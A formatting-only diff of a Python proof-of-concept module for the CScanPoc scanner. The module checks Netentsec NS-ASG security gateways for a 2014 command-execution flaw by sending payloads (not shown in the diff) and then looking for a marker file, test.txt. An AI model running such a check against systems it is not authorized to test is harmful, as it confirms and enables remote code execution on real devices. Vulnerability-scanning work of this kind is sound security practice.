@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'Netentsec_0013'  # 平台漏洞编号，留空
     name = '网康NS-ASG 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2014-04-30'  # 漏洞公布时间
     desc = '''
         网康 NS-ASG 应用安全网关多处命令执行：
@@ -20,6 +22,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '网康应用安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '2d04823b-d08b-4265-9fc9-c967aa896da0'
@@ -34,7 +37,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer: http://www.wooyun.org/bugs/wooyun-2014-058987
+            # refer: http://www.wooyun.org/bugs/wooyun-2014-058987
             hh = hackhttp.hackhttp()
             arg = self.target
             payloads = [
@@ -48,7 +51,7 @@ class Poc(ABPoc):
                     verify = arg + '/test.txt'
                     code, head, res, err, _ = hh.http(verify)
                     #print res
-                    if code==200 and ('testvul'+str(i)) in res:
+                    if code == 200 and ('testvul'+str(i)) in res:
                         #security_hole('command execution: ' + payload)
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
@@ -58,6 +61,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
